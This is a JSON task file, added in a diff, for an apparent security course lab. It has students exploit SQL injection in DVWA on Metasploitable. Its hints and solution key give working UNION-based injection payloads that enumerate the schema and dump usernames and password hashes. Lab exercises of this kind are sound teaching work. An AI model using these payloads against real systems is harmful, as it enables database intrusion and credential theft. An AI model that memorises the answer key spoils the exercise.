@@ -1,0 +1,16 @@
+{
+    "id": "task1",
+    "chapterId": "ch_8",
+    "title": "SQL Injection on DVWA",
+    "description": "Exploit SQLi on DVWA to extract database info.",
+    "estimatedMinutes": 30,
+    "problemStatement": "# Objective\nExploit the SQL Injection vulnerability in DVWA (Security Level: Low) to extract database information.\n\n## Background\nDVWA is installed on Metasploitable at `http://192.168.56.101/dvwa`. Default credentials: `admin` / `password`.\n\n## Steps\n1.  Log in to DVWA and set security level to **Low**.\n2.  Navigate to **SQL Injection**.\n3.  Find the number of columns using `' UNION SELECT NULL, NULL...`.\n4.  Determine which columns reflect data by replacing NULLs with numbers (e.g., `1,2,3`).\n5.  Extract the database name using `database()`.\n6.  Extract table names from `information_schema.tables`.\n7.  Extract column names from the `users` table.\n8.  Dump the usernames and password hashes.\n\n## Deliverable\nScreenshot showing the extracted password hashes.",
+    "hints": [
+        "Start with: `1' UNION SELECT 1,2 -- `",
+        "Database name: `1' UNION SELECT 1,database() -- `",
+        "Tables: `1' UNION SELECT 1,table_name FROM information_schema.tables -- `",
+        "Passwords: `1' UNION SELECT user,password FROM users -- `"
+    ],
+    "expectedOutput": "List of users and MD5 hashes (e.g., admin:5f4dcc3b5aa765d61d8327deb882cf99).",
+    "solutionCode": "# Step 1: Find columns (2 columns)\n1' UNION SELECT 1,2 -- \n\n# Step 2: Get database name (dvwa)\n1' UNION SELECT 1,database() -- \n\n# Step 3: Get tables (users, guestbook)\n1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' -- \n\n# Step 4: Get columns from users\n1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' -- \n\n# Step 5: Dump users\n1' UNION SELECT user,password FROM users -- "
+}
